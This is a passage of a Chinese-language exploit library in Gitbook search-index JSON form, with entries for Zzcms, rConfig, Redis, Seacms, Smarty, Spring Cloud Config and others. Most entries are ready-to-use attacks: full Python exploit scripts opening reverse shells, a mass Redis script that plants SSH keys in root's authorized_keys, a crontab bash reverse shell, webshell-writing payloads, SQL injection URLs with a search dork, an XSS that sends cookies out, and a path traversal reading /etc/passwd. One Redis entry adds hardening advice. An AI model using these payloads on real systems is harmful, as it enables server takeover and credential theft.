v4.7.1分析 从入口文件admin.php查看: 查看language.php,满足指定的文件存在，并传入的cont1参数和原本设置的$langpref参数不等，进入save_language($cont1)。 调用save_file方法。 由于只有一个数据，直接182写入php文件。 至此，langpref的值变成可控值，这个值对应的文件，用于控制网站的语言选择，会自动被全局php文件包含。可以包含上传功能点上传的图种文件解析其中的一句话导致getshell。文件上传功能点使用白名单，但是没有进行重命名，所以路径可以简单猜解。 2、复现过程 文件上传一个可以写一句话木马的php图种。 上述参数保存于php文件： \\data\\settings\\langpref.php 由于该参数是网站语言控制的php文件，访问任意网页，包含langpref对应的文件。 访问生成的php一句话木马。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:41:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pyspider/1.html":{"url":"0day/Pyspider/1.html","title":"pyspider未授权访问","keywords":"","body":"pyspider未授权访问 一、漏洞简介 pyspider未授权访问 二、影响范围 三、复现过程 https://github.com/ianxtianxt/Pyspider-webui-poc 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 04:05:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/R&D Visions CMS/1.html":{"url":"0day/R&D Visions CMS/1.html","title":"R&D Visions CMS  SQL Injection","keywords":"","body":"R&D Visions CMS SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 Google Dork: intext:\"Website by R&D Visions\" inurl:.php?id= intext:\"CMS System by R&D Visions\" Demo: https://www.0-sec.org/home.php?newid=53[SQLi] Injection: https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--+ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-24 13:48:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/rConfig/1.html":{"url":"0day/rConfig/1.html","title":"（CVE-2019-16662）rConfig远程命令执行","keywords":"","body":"（CVE-2019-16662）rConfig远程命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php -r '$sock=fsockopen(\"1.2.3.4\",1234);exec(\"/bin/sh -i &3 2>&3\");'` pyton脚本一 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16662 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 4: print \"[+] Usage : ./exploit.py target ip port\" exit() target = sys.argv[1] ip = sys.argv[2] port = sys.argv[3] payload = quote(''';php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#'''.format(ip, port)) install_path = target + \"/install\" req = requests.get(install_path, verify=False) if req.status_code == 404: print \"[-] Installation directory not found!\" print \"[-] Exploitation failed !\" exit() elif req.status_code == 200: print \"[+] Installation directory found!\" url_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload print \"[+] Triggering the payload\" print \"[+] Check your listener !\" requests.get(url_to_send, verify=False) python脚本二 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16663 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 6: print \"[+] Usage : ./exploit.py target username password ip port\" exit() target = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] request = requests.session() login_info = { \"user\": username, \"pass\": password, \"sublogin\": 1 } login_request = request.post( target+\"/lib/crud/userprocess.php\", login_info, verify=False, allow_redirects=True ) dashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False) if dashboard_request.status_code == 200: print \"[+] LoggedIn successfully\" payload = '''\"\"&amp;&amp;php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#'''.format(ip, port) encoded_request = target+\"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}\".format(quote(payload)) print \"[+] triggering the payload\" print \"[+] Check your listener !\" exploit_req = request.get(encoded_request) elif dashboard_request.status_code == 302: print \"[-] Wrong credentials !\" exit() 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 12:40:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/1.html":{"url":"0day/Redis/1.html","title":"(python)Mongodb-Redis匿名扫描脚本","keywords":"","body":"(python)Mongodb-Redis匿名扫描脚本 一、漏洞简介 (python)Mongodb-Redis匿名扫描脚本 二、影响范围 三、复现过程 https://github.com/ianxtianxt/Mongodb-Redis-scan/ mongodb-redis匿名扫描脚本，支持mongodb和redis的匿名扫描，脚本是之前有需求写的，现在分享给大家学习和研究: 用法： 批量扫描：Mongodbscan.py -m 100 -u ip.txt url.txt IP段扫描：Mongodbscan.py -m 100 -g 192.168.1.1-192.168.1.254 url.txt python2环境 pip install redis 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 10:09:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/2.html":{"url":"0day/Redis/2.html","title":"(python)redis未授权批量提权脚本","keywords":"","body":"(python)redis未授权批量提权脚本 一、漏洞简介 (python)redis未授权批量提权脚本 二、影响范围 三、复现过程 安装依赖 ☁ ~ sudo easy_install redis 使用 ☁ redis python hackredis.py usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT] For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22 optional arguments: -h, --help show this help message and exit -l IPLIST the hosts of target -p PORT the redis default port -r ID_RSAFILE the ssh id_rsa file you generate -sp SSH_PORT the ssh port 首先需要ssh密钥: ☁ ~ ssh-keygen -t rsa ☁ ~ cp ~/.ssh/id_rsa.pub /tmp/foo.txt 之后将ip列表填入ip.txt，然后就可以跑了。 成功的将会输出到success.txt,执行成功但是ssh连接失败的会存储在unconnect.txt，操作失败的会存储在fail.txt。 #!/usr/bin/python #coding:utf-8 ############################################################# ## @file hackredis.py ## ## @date 2015-12-11 ## ## @author evi1cg ## ############################################################# import redis import argparse import textwrap import sys import pexpect def getargs(): parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\\ For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22''')) parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target') parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port') parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate') parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port') if(len(sys.argv[1:]) / 2 != 4): sys.argv.append('-h') return parser.parse_args() def hackredis(host,port): ck = 0 try: print \"[*] Attacking ip:%s\"%host r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) r.flushall r.set('crackit',foo) r.config_set('dir','/root/.ssh/') r.config_set('dbfilename','authorized_keys') r.save() ck =1 except: print \"\\033[1;31;40m[-]\\033[0m Something wrong with %s\"%host write(host,2) ck =0 if ck == 1: check(host) else: pass def check(host): print '\\033[1;33;40m[*]\\033[0m Check connecting... ' try: ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port)) i = ssh.expect('[#\\$]',timeout=2) if i == 0: print \"\\033[1;34;40m[+]\\033[0m Success !\" write(host,1) else: pass except: print \"\\033[1;32;40m[-]\\033[0m Failed to connect !\" write(host,3) def write(host,suc): if suc == 1: filesname = 'success.txt' elif suc ==2: filesname = 'fail.txt' elif suc ==3: filesname = 'unconnect.txt' else: pass file_object = open(filesname,'a') file_object.write(host+' ') file_object.close() def main(): global foo,ssh_port paramsargs = getargs() try: hosts = open(paramsargs.iplist,\"r\") except(IOError): print \"Error: Check your hostfile path \" sys.exit(1) port = paramsargs.port ssh_port = paramsargs.ssh_port try: foo = ' '+open(paramsargs.id_rsafile,\"r\").readline()+' ' except(IOError): print \"Error: Check your wordlist path \" sys.exit(1) ips = [p.replace(' ','') for p in hosts] for ip in ips: hackredis(ip.strip(),port) if __name__ == \"__main__\": main() 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-31 13:28:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/3.html":{"url":"0day/Redis/3.html","title":"redis未授权访问漏洞","keywords":"","body":"redis未授权访问漏洞 一、漏洞简介 redis未授权访问漏洞 二、影响范围 三、复现过程 1.环境安装 从官网wget到本地 wget http://download.redis.io/releases/redis-3.2.11.tar.gz tar xzf redis-3.2.11.tar.gz 将redis.conf copy到 /etc/下 启动时使用命令 redis-server /etc/redis.conf 测试时建议 vim /etc/redis.conf 去掉ip绑定，允许除本地外的主机远程登录redis服务 (1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0 (2)protected-mode设为no 如图 2.攻击者常用命令 （1）info 查看信息 （2）flushall 删除所有数据库内容： （3）flushdb 刷新数据库 （4）看所有键：KEYS *，使用select num可以查看键值数据。 （5）set test \"who am i\" 设置变量 （6）config set dir dirpath 设置路径等配置 （7）config get dir/dbfilename 获取路径及数据配置信息 （8）save 保存 （9）get 变量，查看变量名称 3.msf下利用模块 auxiliary/scanner/redis/file_upload auxiliary/scanner/redis/redis_login auxiliary/scanner/redis/redis_server 4.nmap获取信息 命令：nmap -A -p 6379 --script redis-info ipaddress 5.连接Redis服务器 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/4.html":{"url":"0day/Redis/4.html","title":"redis总结","keywords":"","body":"redis总结 一、漏洞简介 redis总结 二、影响范围 三、复现过程 攻击的几种方法 参考:http://www.cnblogs.com/xiaozi/p/7568272.htmlhttps://evi1cg.me/archives/hackredis.html (1).利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 nc -lvnp 7999 然后执行命令: root@kali:~## redis-cli -h 192.168.63.130 192.168.63.130:6379> set x \"\\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\\n\" 192.168.63.130:6379> config set dir /var/spool/cron/ 192.168.63.130:6379> config set dbfilename root 192.168.63.130:6379> save ps:此处使用bash反弹shell，也可使用其他方法 (2).写ssh-keygen公钥然后使用私钥登陆 在以下条件下，可以利用此方法 1、Redis服务使用ROOT账号启动 2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 首先在本地生成一对密钥： root@kali:~/.ssh## ssh-keygen -t rsa 然后redis执行命令： ssh-keygen -t rsa (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > foo.txt cat foo.txt | redis-cli -h x.x.x.x -x set crackit redis-cli -h x.x.x.x > config set dir /root/.ssh/ > config get dir > config set dbfilename \"authorized_keys\" > save ssh -i id_rsa root@x.x.x.x 或者如下 192.168.63.130:6379> config set dir /root/.ssh/ 192.168.63.130:6379> config set dbfilename authorized_keys 192.168.63.130:6379> set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n\" 192.168.63.130:6379> save (3).往web物理路径写webshell 当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell 192.168.63.130:6379> config set dir /var/www/html/ 192.168.63.130:6379> config set dbfilename shell.php 192.168.63.130:6379> set x \"\" 192.168.63.130:6379> save 即可将shell写入web目录(web目录根据实际情况 (4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网） From:http://www.00theway.org/2017/03/27/redis_exp/ 写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。 local function hex2bin(hexstr) local str = \"\" for i = 1, string.len(hexstr) - 1, 2 do local doublebytestr = string.sub(hexstr, i, i+1); local n = tonumber(doublebytestr, 16); if 0 == n then str = str .. '\\00' else str = str .. string.format(\"%c\", n) end end return str end local dir = redis.call('config','get','dir') redis.call('config','set','dir','/tmp/') local dbfilename = redis.call('config','get','dbfilename') redis.call('config','set','dbfilename','t') local rdbcompress = redis.call('config','get','rdbcompression') redis.call('config','set','rdbcompression','no') redis.call('flushall') local data = '1a2b3c4d5e6f1223344556677890aa' redis.call('set','data',hex2bin('0a7c7c7c'..data..'7c7c7c0a')) local rst = {} rst[1] = 'server default config' rst[2] = 'dir:'..dir[2] rst[3] = 'dbfilename:'..dbfilename[2] rst[4] = 'rdbcompression:'..rdbcompress[2] return rst 保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行 redis-cli --eval a.lua -h *.*.*.* 由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。 redis-cli save -h *.*.*.* redis-cli config set dir *** -h *.*.*.* redis-cli config set dbfilename *** -h *.*.*.* redis-cli config set rdbcompression * -h *.*.*.* 目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了 |||作为提取最终文件的标识）。 */1 * * * * python -c 'open(\"/tmp/rst\",\"a+\").write(open(\"/tmp/t\").read().split(\"|||\")[1])' /tmp/rst为最终上传的文件。 (5).傻瓜式python脚本 From:https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py 执行命令 需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。 python redis_exp.py --host *.*.*.* -c 'id' 上传文件 上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据 python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py 暴力猜解目录 不需要root权限，利用 config set dir 'xx' 报错进行目录猜解 python redis_exp.py --host *.*.*.* -f p.txt 可以通过-p参数更改默认端口，-t参数更改等待时间 (6).批量验证 From:https://github.com/Ridter/hackredis 3.防护措施 1.禁止一些高危命令 修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址 rename-command FLUSHALL \"\" rename-command CONFIG \"\" rename-command EVAL \"\" 2.以低权限运行 Redis 服务 为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆 $ groupadd -r redis && useradd -r -g redis redis 3.为 Redis 添加密码验证 修改 redis.conf 文件，添加 requirepass mypassword 4.禁止外网访问 Redis 修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用 bind 127.0.0.1 5.保证 authorized_keys 文件的安全 为了保证安全，您应该阻止其他用户添加新的公钥。 将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限： ## chmod 400 ~/.ssh/authorized_keys 为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限： ## chattr +i ~/.ssh/authorized_keys 然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限： ## chattr +i ~/.ssh 注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。 6.修改默认端口 指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字 ## redis-server --port 6380 7.防火墙 // accept ## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT ## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT // drop ## iptables -I INPUT -p tcp --dport 6379 -j DROP ## iptables -I INPUT -p udp --dport 6379 -j DROP // 保存规则并重启 iptables ## service iptables save ## service iptables restart 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 10:35:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.28.html":{"url":"0day/Seacms/海洋CMS V6.28.html","title":"Seacms V6.28","keywords":"","body":"海洋CMS V6.28 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 一句话payload，密码cmd: http://0-sec.org/search.php?searchtype=5&tid=&area=eval($_POST[cmd]) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 22:33:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.45.html":{"url":"0day/Seacms/海洋CMS V6.45.html","title":"Seacms V6.45","keywords":"","body":"海洋CMS V6.45 前台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/search.php?searchtype=5 POST searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if} searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo(); 一句话payload，文件test.php 密码pass: path: http://0-sec.org/search.php }{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen(\"test.php\",\"w\"),'') 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 22:37:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.54.html":{"url":"0day/Seacms/海洋CMS V6.54.html","title":"Seacms V6.54","keywords":"","body":"海洋CMS V6.54 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo(); 命令执行payload path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem(\"whoami\"); 权限足够的话，file_put_concents(“connect.php”,”“)，然后连接菜刀即可 权限不足的话，利用payload构造url： http://0-sec.org/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9])) 连接放入菜刀，密码是 9[] 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 22:41:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.55.html":{"url":"0day/Seacms/海洋CMS V6.55.html","title":"Seacms V6.55","keywords":"","body":"海洋CMS V6.55 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/* 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 22:43:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms 8.7版本SQL注入.html":{"url":"0day/Seacms/Seacms 8.7版本SQL注入.html","title":"Seacms V8.7版本SQL注入","keywords":"","body":"Seacms V8.7版本SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 18:19:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms<=9.92前台Getshell.html":{"url":"0day/Seacms/Seacms<=9.92前台Getshell.html","title":"Seacms <=9.92前台Getshell","keywords":"","body":"Seacms 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问： http://0-sec.org/data/mysqli_error_trace.php?_=phpinfo(); 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 18:24:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms9.92.html":{"url":"0day/Seacms/Seacms9.92.html","title":"Seacms V9.92越权+Getshell","keywords":"","body":"Seacms V9.92越权+Getshell 一、漏洞简介 二、漏洞影响 三、复现过程 越权 1、首先注册一个普通用户 2、burp抓包改包，下面是发送payload POST /login.php HTTP/1.1 Host: 0-sec.org Content-Length: 49 Cache-Control: max-age=0 Origin: http://192.168.8.143 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://192.168.8.143/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=9smu8an6nvbrqasp5m0o4bmts7 Connection: close dopost=login&userid=test&pwd=123456&validate=djyf&_SESSION[sea_admin_id]=1&_SESSION[sea_ckstr]=djyf 3、 登陆后台页面，可以发现管理员账户变成-1了,也同时拥有管理员的权限 getshell /admin/ip.php if($action==\"set\") { $v= $_POST['v']; $ip = $_POST['ip']; $open=fopen(\"../data/admin/ip.php\",\"w\" ); $str='\"; fwrite($open,$str); fclose($open); ShowMsg(\"成功保存设置!\",\"admin_ip.php\"); exit; 我们再去看一下ip.php格式 我们可以构造一下,然后保存 \";@eval($_POST[pp]);// 看一下ip.php的内容,已经写进去了 连接shell 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 20:21:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/1.html":{"url":"0day/Seacms/1.html","title":"Seacms储存型xss","keywords":"","body":"Seacms 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 POST /member.php?action=chgpwdsubmit oldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9 src的值为http://127.0.0.1/test.js的短链接 当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理员是没有这个权限的。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 14:21:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/2.html":{"url":"0day/Seacms/2.html","title":"Seacms getshell","keywords":"","body":"seacms getshell 一、漏洞简介 海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架 二、漏洞影响 三、复现过程 后台代码如下 \"; fwrite($open,$str); fclose($open); ShowMsg(\"成功保存设置!\",\"admin_ip.php\"); exit; } ?> 这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用 代码如下 # test.js var img = new Image(); img.src= \"http://127.0.0.1/test.php?x=\" + document.cookie + \"&p=\" + location.pathname; # test.php 这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下 代码已经写进了后 管理员添加成功 一句话也写进去了 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 14:30:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Smarty/1.html":{"url":"0day/Smarty/1.html","title":"（CVE-2017-1000480）Smarty<=3.1.31 命令执行RCE","keywords":"","body":"（CVE-2017-1000480）Smarty 一、漏洞简介 在不清理模板名称的自定义资源上调用fetch（）或display（）函数时，3.1.32之前的Smarty 3容易受到PHP代码注入的攻击。 二、漏洞影响 Smarty 三、复现过程 1、搭建环境 测试环境为： PHP5.6.40+Apache2+Smarty3.1.31+Debian9 ➜ html mkdir smarty ➜ html cd smarty ➜ smarty mkdir cache compile templates ➜ smarty composer require smarty/smarty -v ➜ smarty sed -i -e 's/\\^3.1/3.1.31/g' composer.json ➜ smarty composer update ➜ smarty sudo chmod -R 777 . /var/www/html/smarty/index.php 如下： setCacheDir('cache'); $smarty->setCompileDir('compile'); $smarty->setTemplateDir('templates'); $my_security_policy = new Smarty_Security($smarty); $smarty->enableSecurity($my_security_policy); $smarty->registerResource('username', new Smarty_Resource_Widget()); $smarty->display('username:'.$_GET['mochazz']); ?> 2、漏洞分析 具体攻击 payload 如下： http://0-sec.org/index.php?mochazz=*/phpinfo();/* 我们直接从 display 方法开始跟进，会发现其最终会调用 render 方法。在 render 方法分别进行了：生成compile文件名、写入compile文件并包含两个操作。 在第一个操作：生成compile文件名时，我们传入 display 的参数会影响最终的 compile 文件名。例如下面两个 payload 生成的文件名是不一样的。 # 代码：$smarty->display('username:'.$_GET['mochazz']); # payload1：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();/* 4f97532c32c10229713a39421c918cf16663bf6e_0.username.*.php # payload2：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();// 1e95a2d156a7edd4f6130643849a588dce4acb27_0.username.phpinfo();.php 这是因为 compile 文件名中，有一部分由 basename($source->name) 决定，这部分就是我们传入的 mochazz 参数。使用上面第一个 payload 时，文件名就会包含 号。在 Linux 系统下，文件名允许包含 号，但是 Windows 却不允许，这也是网络上部分文章说这个漏洞无法在 Windows 平台下利用。但是我们使用第二个 payload ，两个平台就都可以利用。 我们接着看第二个操作：写入 compile 文件并包含。首先，写入 compile 文件中的内容包含模板路径（即下图最后一行代码 $_template->source->filepath ），这个模板路径就是我们传入 display 方法的参数。虽然该参数被注释包裹，但是我们可以用 */ 闭合。写入 compile 文件，程序就开始包含该文件，最终导致代码执行（下图第137行）。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Spring Cloud Config Server/1.html":{"url":"0day/Spring Cloud Config Server/1.html","title":"（CVE-2019-3799）任意文件读取 ","keywords":"","body":"（CVE-2019-3799）任意文件读取 一、漏洞简介 二、漏洞影响 Spring Cloud Config 2.1.0 to 2.1.1 Spring Cloud Config 2.0.0 to 2.0.3 Spring Cloud Config 1.4.0 to 1.4.5 其他不受支持的老版本 （如Spring Cloud Config1.3及其以下版本） 三、复现过程 /test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 23:28:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === 